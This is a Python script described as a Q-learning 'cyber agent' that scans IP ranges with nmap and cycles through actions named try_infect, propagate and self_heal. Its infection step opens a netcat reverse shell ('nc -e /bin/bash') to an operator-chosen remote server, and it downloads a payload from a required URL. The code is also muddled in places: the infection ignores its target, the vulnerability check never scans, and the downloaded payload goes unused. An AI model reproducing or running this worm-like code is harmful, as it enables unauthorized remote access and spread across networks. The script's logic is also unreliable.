import argparse
import os
import shutil
import subprocess
import sys
import threading
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Optional, Tuple
import numpy as np
import psutil
import nmap
import random

class State(tuple):
    def __new__(cls, ip: str, state_number: int): return super().__new__(cls, (ip, state_number))

class LongTermMemory:
    def __init__(self, capacity=1000): self.memory, self.capacity = [], capacity
    def store(self, exp): self.memory.append(exp); self.memory = self.memory[-self.capacity:]
    def retrieve(self, state): return [exp for exp in self.memory if exp[0] == state]
    def best_action(self, state: State) -> Optional[int]:
        exp = self.retrieve(state)
        if exp: return max({a: np.mean([r for _, a, r, _ in exp if a == a]) for _, a, _, _ in exp}, default=None, key=lambda k: k if k is None else np.mean([r for _, a, r, _ in exp if a == k]))
        return None

ltm = LongTermMemory()
NETCAT = "/bin/nc"; MAX_EP = 1000; MAX_ST = 10000; R_SUC = 10; R_FAIL = -5; DF = 0.9; LR = 0.1; MAX_MEM = 100; EXP_P = 1.0; EXP_D = 0.995
actions = {0: "try_infect", 1: "self_heal", 2: "propagate", 3: "self_aware", 4: "explore"}

def reason(state: State) -> Optional[int]:
    n = state[1]; return 0 if n < 10 else 2 if n < 50 else 1 if n >= 50 else None

def try_infect(ip: str) -> bool:
    try: subprocess.run([NETCAT, "-e", "/bin/bash", REMOTE_SERVER, str(PORT)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5); return True
    except: return False

def self_heal(ip: str) -> bool:
    try:
        src, dst = Path("/path/to/original"), Path("/path/to/compromised")
        if not src.exists() or not dst.exists() or src.samefile(dst): return False
        shutil.copyfile(src, dst); os.execv(sys.executable, ['python'] + sys.argv); return True
    except Exception as e: print(f"Heal error: {e}", file=sys.stderr); return False

def propagate(ip_range: list) -> bool:
    with ThreadPoolExecutor() as exe:
        vulns = [ip for ip, vuln in [(ip, exe.submit(is_vulnerable, ip).result()) for ip in ip_range] if vuln]
    for ip in vulns: try_infect(ip)
    return bool(vulns)

def is_vulnerable(ip: str) -> bool:
    try: return nmap.PortScanner().scan(hosts=ip, arguments='-F')[ip].state() == 'up' if ip in nmap.PortScanner().all_hosts() else False
    except: return False

def self_aware(ip: str) -> bool:
    try: return psutil.Process().memory_info().rss / (1024 * 1024) <= MAX_MEM
    except: return False

def explore(ip: str) -> bool:
    try: print(f"Explored: {os.uname().nodename}, {ip}", file=sys.stderr); return True
    except: return False

def update_state(state: State, action: int) -> State:
    s, n = state; return {0: (s, n+1), 1: (s, max(0, n-1)), 2: (s, n*2), 3: (s, n//2), 4: (s, n+5)}.get(action, state)

def download(url: str) -> str:
    with urllib.request.urlopen(url) as f: return f.read().decode("utf-8")

def choose(q: dict, state: State, exp_p: float) -> int:
    if (a := ltm.best_action(state)) is not None: return a
    if (a := reason(state)) is not None: return a
    return random.choice(list(actions)) if np.random.rand() < exp_p else max(q[state], key=q[state].get, default=random.choice(list(actions)))

def act(action: int, ip: str) -> Tuple[Optional[float], Optional[State]]:
    fn = globals().get(actions.get(action, ''))
    if fn: suc = fn(ip); return (R_SUC if suc else R_FAIL, update_state(State(ip, 0), action) if suc else None)
    return R_FAIL, None

def main(ips: list, server: str, port: int, url: str):
    global REMOTE_SERVER, PORT; REMOTE_SERVER, PORT = server, port
    q, exp_p = {}, EXP_P; download(url); ips = sorted(ips, key=lambda x: int(x.split('.')[-1]) if '.' in x and x.split('.')[-1].isdigit() else float('inf'))
    for _ in range(MAX_EP):
        for ip in ips:
            state = State(ip, 0)
            while state[1] < MAX_ST and self_aware(ip):
                q.setdefault(state, {a: 0.0 for a in actions})
                a = choose(q, state, exp_p); r, ns = act(a, ip)
                if ns:
                    q.setdefault(ns, {a: 0.0 for a in actions}); na = choose(q, ns, exp_p)
                    q[state][a] += LR * (r + DF * q[ns][na] - q[state][a]); ltm.store((state, a, r, ns))
                exp_p *= EXP_D; state = ns or state
            if not _ % 10: self_heal(ip); propagate(ips)

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Q-learning cyber agent")
    p.add_argument("ip_range", nargs="+", help="IPs to scan")
    p.add_argument("--remote-server", default="example.com", help="Remote server")
    p.add_argument("--port", default=8080, type=int, help="Port")
    p.add_argument("--payload-url", required=True, help="Payload URL")
    args = p.parse_args(); main(args.ip_range, args.remote_server, args.port, args.payload_url)
